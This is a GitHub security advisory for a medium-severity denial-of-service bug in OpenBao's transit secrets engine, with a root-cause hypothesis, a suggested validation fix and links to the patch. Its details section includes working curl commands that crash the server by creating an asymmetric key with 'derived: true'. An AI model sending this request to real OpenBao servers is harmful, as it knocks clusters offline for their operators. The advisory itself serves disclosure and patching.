# [M] OpenBao: Transit secrets engine crashes on key creation with `derived: true` for asymmetric key types

## Summary
Severity: Medium
Advisory: GHSA-8w8f-r2xv-4q4j
CVE: CVE-2026-55776
CWE: CWE-617
Ecosystem: Go
CVSS: CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:N/I:N/A:H (CVSS_V3)
Published: 2026-06-19
Source: https://github.com/advisories/GHSA-8w8f-r2xv-4q4j
Type: github-advisory

## Affected
- Go: `github.com/openbao/openbao` — affected >=0.1.0
- Go: `github.com/openbao/openbao` — affected >=0 <0.0.0-20260617104123-db57c62602b2

## Details
On OpenBao 2.5.4 and 2.5.2(and likely earlier versions also), an authenticated caller with write access to `transit/keys/*` can crash the OpenBao server by issuing a single key-creation request that combines an asymmetric `type` (`rsa-*`, `ecdsa-*`, `ed25519`)
with `derived: true`. The server returns no HTTP response and the process terminates (exit code 2). This is a remote, low-complexity denial-of-service against the OpenBao server.


Mount the transit engine:

     `curl -sS -X POST -H "X-Vault-Token: root" \
       -d '{"type":"transit"}' \
       http://127.0.0.1:8200/v1/sys/mounts/transit`

Trigger the crash:

     `curl -sS -w '\nHTTP %{http_code}\n' -X POST \
       -H "X-Vault-Token: root" \
       -H "Content-Type: application/json" \
       -d '{"type":"rsa-2048","derived":true,"exportable":true,"deletion_allowed":false}' \
       http://127.0.0.1:8200/v1/transit/keys/some-key-name`

You can try with both JSON or HCL It will crash the entire cluster.

  Observed:
     HTTP 000
     curl: (52) Empty reply from server

     $ docker ps -a --filter name=openbao
     STATUS: Exited (2)

Root Cause (Hypothesis)
Key-derivation paths in the transit engine appear to assume a symmetric key shape (a derivable key context). When `derived: true` is supplied alongside an asymmetric `type`, the creation path likely panics on a missing derived-key field or
  invalid type assertion rather than returning a structured validation error. Maintainers should confirm against the transit `policy.go` / key-creation path.

Suggested fix:
Validate the (`type`, `derived`) combination at the top of the create-key handler. Reject with a 400 if `derived: true` is set on any non-symmetric type (i.e. anything other than aes128-gcm96, aes256-gcm96, chacha20-poly1305,
xchacha20-poly1305). Do this before any code path that may panic on missing derived-key state.

## References
- https://github.com/openbao/openbao/security/advisories/GHSA-8w8f-r2xv-4q4j
- https://github.com/openbao/openbao/pull/3309
- https://github.com/openbao/openbao/commit/db57c62602b25da12951f3f0edb888e7c4da61e5
- https://github.com/openbao/openbao
- https://github.com/openbao/openbao/releases/tag/v2.5.5
